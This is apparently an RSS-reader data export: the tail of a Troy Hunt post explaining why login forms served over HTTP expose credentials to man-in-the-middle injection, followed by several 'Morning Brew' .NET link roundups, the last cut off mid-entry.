that<a href=\"http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html\">it’s not about encryption</a>. Well that’s one feature of secure sockets, another really essential one is<em>integrity</em>insofar as it gives us confidence that the website content hasn’t been manipulated.<em>Anything you load over an HTTP connection can be easily changed by a man in the middle</em>which is why it’s absolutely essential to load those login forms over a secure connection. OWASP is very specific about this in<a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">part 9 of their Top 10 web application security risks</a>and summarise it well in the<a href=\"https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\">transport layer protection cheat sheet</a>:</p><blockquote><p>The initial login page, referred to as the \"login landing page\", must be served over TLS. Failure to utilize TLS for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location.</p></blockquote><p>It’s not just Woolworths doing this, in fact it’s extremely common and you’ll see it on<a href=\"http://www.godaddy.com/\">GoDaddy</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"GoDaddy login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-R3oO1habrgc/UZoNCGOyApI/AAAAAAAAFVk/f_oRmxXp2HE/image5.png?imgmax=800\" border=\"0\"></p><p>On<a href=\"http://www.pandora.com/\">Pandora</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Pandora login page loaded over HTTP\" src=\"http://lh6.ggpht.com/-j0-9eUp6Duo/UZoNC8NU1JI/AAAAAAAAFVs/htmQtMnpu04/image8.png?imgmax=800\" border=\"0\"></p><p>And even on the<a href=\"http://www.ft.com/\">Financial Times</a>:</p><p><img width=\"741\" height=\"413\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Financial Times login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-XB1UNVWqNSA/UZoNDirIWgI/AAAAAAAAFV0/xi0Lb_lkJSE/image61.png?imgmax=800\" border=\"0\"></p><p>I’m calling out these simply because they’re high-profile sites yet they all load the login forms over HTTP and post to HTTPS. Why aren’t they implementing SSL correctly? Most likely convenience; customers can login direct from the homepage and they can have it delivered over HTTP. Mind you Pandora links off to a login page so why they couldn’t just serve that securely to begin with is a bit of a mystery.</p><p>So how should it be done? Load the login form over HTTPS, either by linking to a dedicated login page or popping it up in a separate window (although there’s a UX argument against this). Even better, just load the whole site over HTTPS! Yes, there are some barriers to HTTPS across the board (managing certs in web farms, dependencies on assets from third parties, impact on CDNs, etc) but it sure solves the login form issue. Check out<a href=\"http://www.netflix.com\">Netflix’s approach</a>– straight into HTTPS, job done!</p><p>The other issue with the examples above is that potential manipulation of the content aside, missing HTTPS on the login form leads to exactly the discussion this post opened with – users not believing their credentials are protected. All the messaging we’ve been delivering to website users since the early days of the web about checking for the padlock in the browser address bar goes down the drain because it’s simply not there! There’s no assurance that their credentials will be protected and it’s a real shame to dilute such an important security message.</p><p>As for how the exploit in the video works, it’s just a simple<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>to inject the keylogger before the body tag closes off. The keylogger itself is<a href=\"https://code.google.com/p/javascript-keylogger/\">over on Google Code</a>, the only code I wrote to incorporate it was the script tags you saw at the end of the video and the “Hack Yourself” website which receives the logged keys. It really is that simple.</p><p>Whilst Fiddler is good for demonstration purposes, clearly an actual weaponised attack would work differently but the principle is the same: When unencrypted traffic passes through a node on the network – NIC, ethernet cable, router, proxy, ISP, etc. – it may be observed or manipulated by an attacker. This isn’t theoretical, there are many precedents such as<a href=\"http://www.thetechherald.com/articles/Tunisian-government-harvesting-usernames-and-passwords/12429/\">the Tunisian government harvesting Facebook credentials en mass</a>.</p><p>This is all a bit odd really, I mean these sites have gone to the effort of implementing<em>some</em>SSL but then blown it by loading those login forms over HTTP. As we saw with Woolworths, posting over a secure connection is completely useless if there’s no integrity in the login form itself, an attacker may already have the credentials by then if the connection is compromised which is the very risk they all implemented SSL to protect from in the first place!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/2MOCxoW2JyE\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1229}}
{"k":"0000000084","o":"0000003727","v":"001"}
{"_id":1230,"_uid":1230,"_dt":1373742620966,"_s":"2847049078f3810f3953a9de06e124d1"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/0RUr_y4rsf8/","title":"The Morning Brew #1396","published":{"$wrap":"$date","v":1373531396000,"h":"2013-07-11T08:29:56.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/07/10/httpclient-2-2-is-now-rc.aspx\">HttpClient 2.2 is now RC</a> - Immo Landwerth announces the Release Candidate Release of the HttpClient Portable Class Library.  This release includes the automatic decompression feature, and assuming there are no problems with the release candidate it will shortly become an RTM release.</li><li><a href=\"http://matthewmanela.com/blog/chutzpah-2-4-2/\">Chutzpah - Chutzpah 2.4.2</a> - Matthew Manela announces the release of Chutzpah 2.4.2.  This update includes a few bug fixes and also updates the dependency on TypeScript to 0.9.0.1, as well as introducing a  feature to allow the injection of HTML templates into the generated test harness.</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/10/inrelease-acquisition-is-complete.aspx\">InRelease Acquisition is complete</a> & <a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/10/team-foundation-service-update-july-9.aspx\">Team Foundation Service Update - July 9</a> - Brian Harry announces the completion of the Microsoft acquisition of InRelease, a release management product which runs against Team Foundation Server, and announce the availability of the first Microsoft iteration of the product.  Brian also highlights the latest update to the hosted Team Foundation Server, including a number of new features for agaile project management.</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/zainnab/archive/2013/07/10/visual-studio-2013-preview-peek-definition-aka-go-to-definition-peek.aspx\">Visual Studio 2013 Preview: Peek Definition aka Go To Definition (Peek)</a>  & <a href=\"http://blogs.msdn.com/b/zainnab/archive/2013/07/09/visual-studio-2013-preview-codelens-aka-code-information-indicators.aspx\">Visual Studio 2013 Preview: CodeLens aka Code Information Indicators</a> - Zain Naboulsi takes a look at two new Visual Studio 2013 features.  The Peek Definition feature allows easier viewing of the definition of functions from call sites, and CodeLens combines data from the IDE with that in TFS for improved find references.</li><li><a href=\"http://blog.jgc.org/2013/07/your-test-suite-is-trying-to-tell-you.html\">Your test suite is trying to tell you something</a> - John Graham-Cumming urges you to investigate that occasionally failing test in your test suite as it may uncover something interesting about your code base, and some of your assumptions</li><li><a href=\"http://typecastexception.com/post/2013/07/03/Building-Out-a-Clean-REST-ful-WebApi-Service-with-a-Minimal-WebApi-Project.aspx\">Building Out a Clean, REST-ful WebApi Service with a Minimal WebApi Project</a> - Trimming down the standard projects templates seems to be all the rage, and John Atten shares a clean ASP.NET Web API project, and in this article looks at using that clean start to implement a minimal REST API using WebAPI</li><li><a href=\"http://www.dotnetcurry.com/ShowArticle.aspx?ID=913\">Monitoring performance of SignalR Applications</a> - Suprotim Agarwal takes a look at monitoring SignalR applications, using the SignalR performance testing tools to generate load, and looking at the various Web Server and SignalR specific performance counters to monitor.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/0RUr_y4rsf8\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1230}}
{"k":"0000000084","o":"0000003804","v":"001"}
{"_id":1231,"_uid":1231,"_dt":1373742620966,"_s":"d9114c96e942f6819475b2cf385527cf"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/7ZY5ZsM1-ZA/","title":"The Morning Brew #1392","published":{"$wrap":"$date","v":1373021841000,"h":"2013-07-05T10:57:21.000Z"},"starred":false,"read":false,"content":"<p>Closed the laptop too quickly again this morning, which meant it slept before it finished posting - still just about morning here though, so not a complete failure!</p><h3>Software</h3><ul><li><a href=\"http://blog.getglimpse.com/2013/07/04/glimpse-1-5-0-released/\">Glimpse 1.5.0 released</a> - The Glimpse Team announce their latest release, Glimpse 1.5.  This release includes improved configuration making it easier to turn options on and off within Glimpse, some improvements to layouts and linking between the HUD and Glimpse consoles</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/04/team-explorer-everywhere-2012-update-available.aspx\">Team Explorer Everywhere 2012 Update available</a> - Brian Harry highlights the improvements to Team Explorer Everywhere which are shipped in the Update 3 , including support for TFS 2013 Preview, support for the latest version of Eclipse, improvements to file uploads and comparison</li><li><a href=\"http://www.codeproject.com/Tips/615997/CodeSHARPer-A-code-snippet\">CodeSHARPer: A code snippet</a> - Frederico Regateiro highlights CodeSHARPer, a simple C# editor which draws on a number of other open source projects to provide an good editor experience including syntax highlighting and auto complete, useful for those times when you don’t need the full Visual Studio.  The project is open source and available on CodePlex.</li></ul><h3>Information</h3><ul><li><a href=\"http://gunnarpeipman.com/2013/07/browser-link/\">Browser Link - Refresh running application in every browser on Visual Studio 2013</a> - Gunnar Peipman takes a look at another Visual Studio 2013 features, the browser link between the Visual Studio IDE and all the browsers running your site in the development environment, allowing one click in the IDE to refresh all the browsers.  This is an interesting use of SignalR to do the communication.</li><li><a href=\"http://weblogs.asp.net/ricardoperes/archive/2013/07/04/profiling-entity-framework-code-first-with-miniprofiler.aspx\">Profiling Entity Framework Code First With MiniProfiler</a> - Ricardo Peres takes a look at using the MiniProfiler to get a better understanding of what is going on with your Entity Framework Code First code, walking through its use in exploring the performance of your applications.</li><li><a href=\"http://www.codeproject.com/Articles/615395/The-Basics-of-ASP-NET-Performance-Optimization\">The Basics of ASP.NET Performance Optimization</a> - Tiago Pascoal discusses some key concepts in the optimisation of performance in ASP.NET Applications, looking at the use of profiling tools to identify problem areas</li><li><a href=\"http://www.codeproject.com/Articles/615948/Improve-site-load-and-cache-time\">Improve site load and cache time</a> - ‘NewAmbition’ takes a look at a number of techniques to improve the performance of your ASP.NET applications, including automatic image resizing and compression along with bundling and compression of JavaScript and CSS</li></ul><h3>Community</h3><ul><li><a href=\"http://codeofrob.com/entries/working-for-free-and-what-it-taught-me.html\">Working for free and what it taught me</a> - Rob Ashton shares some of the experiences of his time spent working for free across a range of countries, teams and programming languages, sharing some important lessons we should all take heed of.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/7ZY5ZsM1-ZA\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1231}}
{"k":"0000000084","o":"0000003962","v":"001"}
{"_id":1232,"_uid":1232,"_dt":1373742620966,"_s":"e493680957a1b67d1b773e6f7ff7553e"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/NGCpZ0i73Lw/","title":"The Morning Brew #1394","published":{"$wrap":"$date","v":1373358654000,"h":"2013-07-09T08:30:54.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://jeffhandley.com/archive/2013/07/03/ria-services-is-getting-open-sourced.aspx\">RIA Services is Getting Open-Sourced</a> - Jeff Handley announces Microsoft’s plans to open source RIA Services, via the OuterCurve Foundation, as ‘Open RIA Services’ with code hand over occurring this summer</li></ul><h3>Information</h3><ul><li><a href=\"http://dev.solita.fi/2013/07/04/whats-in-a-good-commit.html\">What’s in a Good Commit? </a>  & <a href=\"http://www.jacopretorius.net/2013/07/whats-in-a-good-commit.html\">What’s in a Good Commit?</a> - Timo Mihaljov and Jaco Pretorius discuss best practices for what should go in a commit when developing, with Timo giving the initial list of 5 best practices and Jaco responding to these sharing his opinions</li><li><a href=\"http://blogs.msdn.com/b/paolos/archive/2013/07/08/how-to-integrate-a-mobile-service-with-a-soap-service-bus-relay-service.aspx\">How to integrate a Mobile Service with a SOAP Service Bus Relay Service</a> - Paolo Salvatori takes us on a detailed exploration of combining cloud based Azure Mobile Services with on premise applications, and bridging the gap between the systems usng the Service Bus</li><li><a href=\"http://blogs.msdn.com/b/jimoneil/archive/2013/07/08/practical-azure-24-windows-azure-mobile-services.aspx\">Practical Azure #24: Windows Azure Mobile Services</a> -  Jim O’Neil shares a session recording looking at the Windows Azure Mobile Services - this one is from before //build 2013 so there have been a few new announcements, and Jim shares links to the relevant sessions from Build to extend your knowledge</li><li><a href=\"http://sqlblog.com/blogs/greg_low/archive/2013/07/09/is-there-more-to-using-sql-in-azure-than-redirecting-your-connection-string.aspx\">Is there more to using SQL in Azure than redirecting your connection string?</a> - Greg Low discusses some of the other things you should think about before moving your application databases to the (Azure) cloud as SQL Azure</li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/07/think-virtualizing-sql-server-is-evil.html\">Think virtualizing SQL Server is evil? Here’s a 94 page PDF from the SQL Server team that might have you thinking otherwise… \"Best Practices for Virtualizing and Managing SQL Server 2012\"</a> - Greg Duncan highlights a new whitepaper discussing the best practices for running SQL Server 2012 in virtual environments, something which is ever more important as infrastructure teams continue adopting virtualisation.</li><li><a href=\"http://blogs.msdn.com/b/jgalasyn/archive/2013/07/08/api-diff-report-for-windows-8-and-windows-8-1-preview.aspx\">API diff report for Windows 8 and Windows 8.1 Preview</a> - Jim Galasyn highlights some work by Koen Zwikstra at First Floor Software who has looked at the differences between the APIs exposed in Windows 8.1 compared to those in Windows 8.</li><li><a href=\"http://www.deanhume.com/Home/BlogPost/web-page-performance---profiling-paint-times/91\">Web Page Performance - Profiling paint times</a> - Dean Hume discusses the performance of web pages, specifically looking at the support in Chrome ‘Canary’ to help identiy the paint time of the page.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/08/looking-backndash-my-first-c-program.aspx\">Looking Back: My First C# Program</a> - K Scott Allen takes us on a trip down memory lane, sharing one of his oldest .NET programs, from the early .NET 1.0 beta days</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/NGCpZ0i73Lw\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1232}}
{"k":"0000000084","o":"0000004844","v":"001"}
{"_id":1233,"_uid":1233,"_dt":1373742620967,"_s":"000b9173ca57277f763ca618729e476e"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/sQd2_d2agb0/","title":"The Morning Brew #1381","published":{"$wrap":"$date","v":1371717086000,"h":"2013-06-20T08:31:26.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/interoperability/archive/2013/06/19/for-backbone-js-devs-easily-enable-new-cloud-based-experiences-in-your-apps-with-the-windows-azure-mobile-data-service.aspx\">For Backbone.js devs: easily enable new Cloud based experiences in your apps with the Windows Azure Mobile Data Service</a> - Olivier Bloch highlights the development by Microsoft Open Technologies of an open source Backbone adapter which makes it easy to synchronise data to a Windows Azure Data Services</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/19/enterprise-grade-git.aspx\">Enterprise grade Git</a> - Brian Harry discusses the git support which is going to be front and centre of the Visual Studio 2013 / Team Foundation Server 2013 release, discussing some of the aims the team are addressing with the functionality.</li><li><a href=\"http://www.yuiblog.com/blog/2013/06/19/3-11pr1-released/\">3.11pr1 Released - YUI Blog</a> - The YUI team have release a preview release of YUI 3.11. This release sees some significant changes to Attribute and Base, and they are keen for developers to try out the functionality in existing applications to help them ensure that it all behaves as expected.</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/mssmallbiz/archive/2013/06/18/huge-collection-of-free-microsoft-ebooks-for-you-including-office-office-365-sharepoint-sql-server-system-center-visual-studio-web-development-windows-windows-azure-and-windows-server.aspx?Redirected=true\">Huge collection of Free Microsoft eBooks for you, including: Office, Office 365, SharePoint, SQL Server, System Center, Visual Studio, Web Development, Windows, Windows Azure, and Windows Server</a> - Eric Ligman follows on from the success last year and has updated his list of completely free Microsoft eBooks with all this years titles.  This list covers everything from Office 365 Windows Azure development, and is certain to contain something worth including in your summer reading.</li><li><a href=\"http://www.troyhunt.com/2013/06/dynamic-security-misconfiguration.html\">Dynamic security misconfiguration scanning with OnCheckin and ASafaWeb</a> - Troy Hunt discusses the importance of ongoing security checking and testing in your applications to ensure that your application continues to be as secure as it was when first developed, and discusses how his ASafaWeb tool has now been integrated with OnCheckin, a Cloud based deployment tool.</li><li><a href=\"http://blog.getglimpse.com/2013/06/19/next-up-for-hud/\">Next up for HUD? </a> - Anthony van der Hoorn discusses the feedback from the Glimpse Heads Up Display functionality and starts to look to the future, sharing some of the team’s thoughts on where to take this functionality, and asking for your feedback on the roadmap via a survey.</li><li><a href=\"http://www.codeproject.com/Articles/609053/AngleSharp\">AngleSharp</a> - Florian Rappl shares a detailed article on the use and development of AngleSharp, a library which provides DOM like API onto HTML and CSS content from C# code, going a few steps beyond the HTMLAgilityPack.</li><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/19/update-to-httpclient-and-automatic-decompression.aspx\">Update to HttpClient and Automatic Decompression</a> - Immo Landwerth announces the latest beta release of HttpClient which now supports automatic decompression across all platforms with the team having removed the dependency on the Microsoft.Bcl.Compression library which in turn depended on the native support for decompression.  This has been achieved by bringing the decompression code into HttpClient.</li><li><a href=\"http://www.codeproject.com/Tips/608902/Problems-with-XML-Serialization-and-NET-4-5\">Problems with XML Serialization and .NET 4.5</a> - Jim Lahey highlights some problems he encountered with XML Serialisation when running on .NET 4.5, but not on 4.0, and shows how a configuration setting allows you to control the implementation of the serializer used.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.nxtgenug.net/ViewEvent.aspx?EventID=573\">NxtGenUG - Event: Windows Phone 8 WP8 </a> - The Hereford NxtGenUG are having a session on Windows Phone 8 development which will look at the platform, and explore some of the new features of the WP8 platform.  The event is on Monday 8th July.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/sQd2_d2agb0\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1233}}
{"k":"0000000084","o":"0000002962","v":"001"}
{"_id":1234,"_uid":1234,"_dt":1373742620967,"_s":"c105ac650fbce2eeedb9f8e03e4a5965"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/kWgWfHYDOZw/","title":"The Morning Brew #1391","published":{"$wrap":"$date","v":1372927068000,"h":"2013-07-04T08:37:48.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/07/02/visual-studio-performance-providing-feedback.aspx\">Visual Studio Performance - Providing Feedback</a> - Nathan Halstead discusses the importance of those of you who are trying out the Visual Studio 2013 Preview release to give the team feedback, and particularly give them feedback on the performance of the IDE</li><li><a href=\"http://blogs.windows.com/windows_phone/b/wpdev/archive/2013/07/02/running-the-windows-phone-emulator-on-windows-8-1-preview.aspx\">Running the Windows Phone Emulator on Windows 8.1 Preview</a> - Cliff Simpkins shares important news about running the Windows Phone 8 emulator on Windows 8.1 Preview, highlighting the requirement for Update 3 for Visual Studio 2012 to avoid issues.</li><li><a href=\"http://pragprog.com/news/pragpub-magazine-for-july-new-studio-courses\">PragPub Magazine for July, new Studio Courses</a> - The Pragmatic Bookshelf announce the availability of PragPub magazines July Edition with insights on developing your career as a developer, the story of GitHub along with articles on Elixir, Closure and C++</li><li><a href=\"http://www.nczonline.net/blog/2013/07/02/internet-explorer-11-dont-call-me-ie/\">Internet Explorer 11: \"Don’t call me IE\"</a> - Nicholas C. Zakas takes a look at Internet Explorer 11, disecting the User Agent string for Internet Explorer 11, discussing the changes, and looks at some of the changes to the JavaScript  object model</li><li><a href=\"http://www.codeproject.com/Tips/615433/WPF-Objects-Model-Poster\">WPF Objects Model Poster - CodeProject</a> - ntg123 shares a computer created poster of the the ‘Whole Picture’ of the WPF types and their relations over on CodeProject</li><li><a href=\"http://geekswithblogs.net/anirugu/archive/2013/07/03/mozilla-firefox-23-will-block-mixed-ssl-content.aspx\">Mozilla Firefox 23 Will Block Mixed SSL Content</a> - Anirudha gupta shares the news that the next release of FireFox will block content served up over HTTP when the page is HTTPS, something important to be aware of, meaning that now is the time to go fix any such issues in your sites</li><li><a href=\"http://mtaulty.com/CommunityServer/blogs/mike_taultys_blog/archive/2013/07/03/await-task-task-wait-and-friends.aspx\">await Task, Task.Wait and Friends</a> - Mike Taulty sets about de-mystifying Task and Await, looking at which you probably want to use and when, illustrating simple code with examples to aid comprehension</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/kWgWfHYDOZw\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1234}}
{"k":"0000000084","o":"0000004043","v":"001"}
{"_id":1235,"_uid":1235,"_dt":1373742620967,"_s":"798f85deed13c762e03573c478457324"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/yY_0JJKa0Wk/","title":"The Morning Brew #1380","published":{"$wrap":"$date","v":1371631311000,"h":"2013-06-19T08:41:51.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/typescript/archive/2013/06/18/announcing-typescript-0-9.aspx\">Announcing TypeScript 0.9 </a> & <a href=\"http://blogs.msdn.com/b/somasegar/archive/2013/06/17/typescript-0-9-preview-release.aspx\">TypeScript 0.9 Preview Release</a> - Jonathan Turner and Somasegar announce the release of the Preview Release of TypeScript 0.9.  This is a major step along the road the for the project, introducing a number of exciting new features including Generics support.</li><li><a href=\"http://haacked.com/archive/2013/06/18/semver-2-0-released.aspx\">SemVer 2.0 Released</a> - Phil Haack announce the release of the  SemVer 2.0.0 specification which details the correct formation of Semantic Version Numbers.  This specification release adds a number of clarifications and details of versioning build metadata.</li><li><a href=\"http://fortysix-and-two.blogspot.co.uk/2013/06/fscheck-09-released-and-moved-to-github.html\">FsCheck 0.9 Released and moved to GitHub</a> - Kurt Schelfthout announces the release of version 0.9 of FsCheck, along with the news that the project has been migrated to GitHub, to help aid collaboration, although that seems to be working well already as most of the changes in this release are community sourced.</li></ul><h3>Information</h3><ul><li><a href=\"http://lostechies.com/jimmybogard/2013/06/18/strategies-for-isolating-the-database-in-tests/\">Strategies for isolating the database in tests</a> - Jimmy Bogard discusses the importance of making tests independent of state, and looks at some strategies for working with the biggest form of state in tests, the database, from patterns such as database per developer, to the use of transactions to restore state to how it was.</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/18/deep-dive-into-nuget-native-part-one.aspx\">Deep Dive into NuGet Native (Part One)</a> - Garrett Serack takes us under the covers to look at how NuGet supports C/C++ packages and explores the construction of packages and their constituent parts.</li><li><a href=\"http://weblogs.asp.net/ricardoperes/archive/2013/06/18/nhibernate-conventions.aspx\">NHibernate Conventions</a> - Ricardo Peres takes a look at the use of conventions with NHibernate for the mapping of columns and tables and entities</li><li><a href=\"http://www.adamtibi.net/06-2013/five-essential-front-end-tools-that-should-be-used-with-modern-mvc-projects\">Five Essential Front-End Tools That Should be Used with Modern MVC Projects </a> - Adam Tibi takes a look at some useful libraries you should probably seriously consider including in your web frontend projects to make working with CSS and HTML5 easier.</li><li><a href=\"http://www.hanselman.com/blog/ExclusiveSneakPeakTheAGENTSmartWatchEmulatorAndManagedNETCodeOnMyWrist.aspx\">Exclusive Sneak Peak: The AGENT Smart Watch Emulator and managed .NET code on my wrist!</a> - Scott Hanselman gives us a glimpse of the AGENT smartwatch and the SDK that allows development of your own apps to run on the .NET Micro Framework based watch device.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.irisclasson.com/2013/06/18/ug-tour-in-uk-this-week-and-next/\">UG Tour in UK this week and next</a> - Iris Classon is on a UK Usergroup Tour this week and next, giving sessions at usergroups in Bristol and Gloucestershire already, with the Telerik Developer Seminar today (Weds) in London,   Windows Phone UG London this evening, Dev South Coast in Southampton on Thursday evening and the Windows Store App developer group in London on Monday 24th.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/yY_0JJKa0Wk\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1235}}
{"k":"0000000084","o":"0000004629","v":"001"}
{"_id":1236,"_uid":1236,"_dt":1373742620967,"_s":"e0511415c468d7305c367a21858eda7a"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/txw3h0t-GYc/","title":"The Morning Brew #1382","published":{"$wrap":"$date","v":1371811312000,"h":"2013-06-21T10:41:52.000Z"},"starred":false,"read":false,"content":"<p><b> Slightly late edition today - I closed the laptop lid before it had published!</b></p><h3>Software</h3><ul><li><a href=\"http://blogs.telerik.com/Skimedic/posts/13-06-20/announcing-justcode-q2-2013\">Announcing JustCode Q2 2013</a> -  Phil Japikse announces the latest release of Telerik’s JustCode Visual Studio extension which brings with it a bunch of great new features including decompilation and debugging of dependent assemblies, new macros, test runner improvements and enhanced refactoring capabilities</li><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/06/navigation-improvements-resharper-8/\">Navigation Improvements in ReSharper 8</a> - Dmitri Nesteruk gives a taste of the improvements being made to the code navigation capabilities of ReSharper, introducing their new Go To Everything functionality</li><li><a href=\"http://blogs.msdn.com/b/data__knowledge__intelligence/archive/2013/06/21/microsoft-sql-14-ctp1-product-guide.aspx\">Microsoft SQL 14 CTP1 Product Guide</a> - Deepthi Anantharam highlights the availability of SQL Server 2014 Product Guide documents which outline various use cases for SQL Server 2014 and how the new features of the platform help.</li></ul><h3>Information</h3><ul><li><a href=\"http://msmvps.com/blogs/jon_skeet/archive/2013/06/21/but-what-does-it-all-mean.aspx\">But what does it all mean?</a> - Jon Skeet discusses the importance of semantics in communication, discussing how he is now finding himself being picky about the semantics of data, and the importance of understanding the format of the data being discussed</li><li><a href=\"http://www.tikalk.com/net/c-language-specification-50\">C# Language Specification 5.0 </a> - Menny Rachmanny highlights the C# 5.0 language specification download from Microsoft, discussing why it is useful to have this document as a first port of call reference when you need to understand something about the C# language</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/20/using-visual-studio-2013-to-diagnose-net-memory-issues-in-production.aspx\">Using Visual Studio 2013 to Diagnose .NET Memory Issues in Production - Visual Studio ALM + Team Foundation Server Blog - Site Home - MSDN Blogs</a> - Andrew B Hall gives us a taste of the Visual Studio 2013 capabilities for debugging and diagnosing memory issues in our .NET Applications, discussing the classes of memory issues we run into, and looking at examining an ASP.NET applications memory use with the new tooling.</li><li><a href=\"http://blogs.msdn.com/b/pranab/archive/2013/06/20/unit-testing-javascript-jquery-in-asp-net-mvc-project-using-qunit.aspx\">Unit Testing JavaScript/JQuery in ASP.Net MVC Project using QUnit Step by Step</a> - Pranab Paul takes us on a walkthrough of introducing unit testing of client side behaviours using QUnit in an ASP.NET MVC application which makes use of jQuery</li><li><a href=\"http://www.daedtech.com/introduction-to-unit-testing-part-3-unit-testing-sucks\">Introduction to Unit Testing Part 3: Unit Testing Sucks</a> - Erik Dietrich is mid series on a series looking at Unit Testing, and in this part suggests that you should leave TDD until you are familiar with unit testing, and discusses strategies to introduce unit testing to projects (and developers)</li><li><a href=\"http://kaczanowscy.pl/tomek/2013-06/you-shall-not-test-methods\">You Shall Not Test Methods</a> - Tomek Kaczanowski makes some good points about not specifically testing methods of classes but testing behaviours of classes</li><li><a href=\"http://lostechies.com/jimmybogard/2013/06/20/run-tests-explicitly-in-xunit-net/\">Run tests explicitly in xUnit.net</a> - Jimmy Bogard discusses his migration from NUnit to xUnit.NET, and his need to have tests run at development or build server built time, but not both, and looks at implementing this functionality for xUnit.NET.</li><li><a href=\"http://weblogs.asp.net/rchartier/archive/2013/06/20/getting-started-with-developing-for-the-agent-smartwatch.aspx\">Getting started with Developing for the AGENT SmartWatch </a> - Rob Chartier continues with his look at developing for the AGENT smart watch, exploring the tooling and SDK</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/txw3h0t-GYc\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1236}}
{"k":"0000000084","o":"0000008164","v":"001"}
{"_id":1237,"_uid":1237,"_dt":1373742620968,"_s":"601389e64d626f7204856c64f2f07807"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/W8vy9862FJU/","title":"The Morning Brew #1387","published":{"$wrap":"$date","v":1372407061000,"h":"2013-06-28T08:11:01.000Z"},"starred":false,"read":false,"content":"<p>Another big edition today, still lots of //build/ and Visual Studio 2013 news about.</p><p>Two other snippets of news:</p><ul><li>Tomorrow is <a href=\"http://www.dddeastanglia.com/\">DDD East Anglia</a> down in Cambridge - I’ll be there, and I suspect so will some of you, so if you see me come and say Hi.</li><li>Prompted by a request from a reader for Twitter announcements of posts I’ve set up a new Twitter account (<a href=\"http://twitter.com/MorningBrewNet\">@MorningBrewNet</a>) which hopefully starting from today’s edition will include a tweet announcing the post shortly after it goes live.</li></ul><h3>//build/ and Visual Studio 2013</h3><ul><li><a href=\"http://blogs.msdn.com/b/fsharpteam/archive/2013/06/27/announcing-a-pre-release-of-f-3-1-and-the-visual-f-tools-in-visual-studio-2013.aspx\">Announcing a pre-release of F# 3.1 and the Visual F# tools in Visual Studio 2013</a> - The F# Team announce the release of the preview release of F# 3.1 and the Visual F# Tools included as a part of the Visual Studio 2013 